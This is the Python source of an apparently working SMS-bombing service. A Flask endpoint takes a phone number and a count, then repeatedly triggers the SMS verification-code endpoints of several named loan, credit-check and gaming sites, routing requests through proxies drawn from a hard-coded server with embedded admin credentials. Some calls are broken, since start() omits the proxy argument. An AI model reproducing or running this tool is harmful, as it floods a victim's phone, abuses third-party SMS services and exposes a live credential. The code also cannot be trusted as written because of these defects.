from wsgiref.simple_server import make_server
from flask import Flask, request
import json
import requests
import time
import re
import datetime
from lxml import etree

app = Flask(__name__)
count = 0


# 只接受get方法访问
@app.route("/test_1.0", methods=["GET"])
def check():
    # 默认返回内容
    return_dict = {'return_code': '200', 'return_info': '处理成功', 'result': False}
    # 判断入参是否为空
    if request.args is None:
        return_dict['return_code'] = '5004'
        return_dict['return_info'] = '请求参数为空'
        return json.dumps(return_dict, ensure_ascii=False)
    # 获取传入的params参数
    get_data = request.args.to_dict()
    phone = get_data.get('phone')
    times = int(get_data.get('times'))
    # 对参数进行操作
    return_dict['result'] = start(phone, times)


def getProxy():
    s = requests.session()
    s.keep_alive = False

    url = 'http://120.27.216.150:5000'
    headers = {
        'Connection': 'close',
    }
    proxy = s.get(url=url, headers=headers, auth=('admin', 'zd123456')).text[0:-6]
    return proxy


# %% 正规贷款

def zgdk(phone, proxy):
    global count
    data = {'mobile': phone}
    response = requests.post(url='https://mgjr.360yhzd.com/api/sms/getCode', data=data, proxies=proxy)
    text = response.text
    if '提交成功' in text:
        print('正规贷款信息发送成功!')
        count = count + 1
    else:
        print('正规贷款信息发送失败！')


# %% 融多多贷款

def rdd(phone, proxy):
    global count
    session = requests.session()
    url = 'https://91rongduoduo.com/m/bdss04'
    text = session.get(url, proxies=proxy).text
    html = etree.HTML(text)
    usertoken = html.xpath('//input[@id="usertoken"]/@value')[0]
    data = {
        'phone': phone,
        'name': '张伟伟',
        'usertoken': usertoken
    }
    response = session.post(url='https://91rongduoduo.com/m/center_code', data=data, proxies=proxy)
    text = response.text
    if '发送成功' in text:
        print('融多多贷款信息发送成功!')
        count = count + 1
    else:
        print('融多多贷款信息发送失败！')


# %% 穆帅贷款

def ms(phone, proxy):
    global count
    session = requests.session()
    url = 'http://msswxx.com/m/mss01'
    text = session.get(url, proxies=proxy).text
    html = etree.HTML(text)
    usertoken = html.xpath('//input[@id="usertoken"]/@value')[0]
    data = {
        'phone': phone,
        'name': '张伟伟',
        'usertoken': usertoken
    }
    response = session.post(url='http://msswxx.com/m/center_code', data=data, proxies=proxy)
    text = response.text
    if '发送成功' in text:
        print('穆帅贷款信息发送成功!')
        count = count + 1
    else:
        print('穆帅贷款信息发送失败！')


# %% 郎宇信息

def lyxx(phone, proxy):
    global count
    data = {'mobile': phone}
    response = requests.post(url='http://www.lyxxjs.com/msm/code/sendSms.do', data=data, proxies=proxy)
    text = response.text
    if '发送成功' in text:
        print('郎宇信息信息发送成功!')
        count = count + 1
    else:
        print('郎宇信息信息发送失败！')


# %% 店透视

def dtx(phone, proxy):
    global count
    headers = {'Referer': 'https://www.diantoushi.com/useradmin.html?type=searchBlack'}
    url = f'https://www.diantoushi.com/user/v2/captcha?mobile={phone}'
    response = requests.get(url=url, headers=headers, proxies=proxy)
    if '"status":0,"message":"ok"' in response.text:
        print('店透视信息发送成功!')
        count = count + 1
    else:
        print('店透视信息发送失败！')


# %% 查征信

def czx(phone, proxy):
    global count
    headers = {
        'accept': '*/*',
        'content-type': 'application/json',
        'referer': 'https://www.sczhengxin.com/h5/index.html?Channel=bdpcxyd01&bd_vid=10244023290222874317',
        'x-requested-with': 'XMLHttpRequest',
    }
    url = 'https://www.sczhengxin.com/api/home/SmsPush'
    response = requests.post(url=url, data=json.dumps({"PhoneNumber": phone}), headers=headers, proxies=proxy)
    # print(response.text)
    if '"statusCode":0,"code":1' in response.text:
        print('查征信信息发送成功!')
        count = count + 1
    else:
        print('查征信信息发送失败！')


# %%  4399
def ssjj(phone, proxy):
    global count
    url = 'http://ptlogin.4399.com/ptlogin/sendPhoneLoginCode.do?phone={}&appId=www_home&v=1&sig=&t={}&v=1'.format(
        phone, int(time.time() * 1000))
    response = requests.get(url, proxies=proxy)
    if '4' in response.text:
        print('4399信息发送成功!')
        count = count + 1
    else:
        print('4399信息发送失败！')


# %% 轰炸开始
def start(phone, times):
    # phone = srhm()
    ret = re.match(r"^1[345678]\d{9}$", phone)
    if ret:
        result_str = '正在起飞'
        while 1:
            rdd(phone)
            zgdk(phone)
            ms(phone)
            lyxx(phone)
            dtx(phone)
            czx(phone)
            ssjj(phone)
            # print('已经发送{}条信息'.format(count))
            if count >= times:
                break
            time.sleep(1)
    else:
        # print('手机号码不正确，请重试！')
        result_str = '手机号码不正确'
    return result_str


if __name__ == "__main__":
    server = make_server('0.0.0.0', 5000, app)
    server.serve_forever()
    app.run(debug=True)
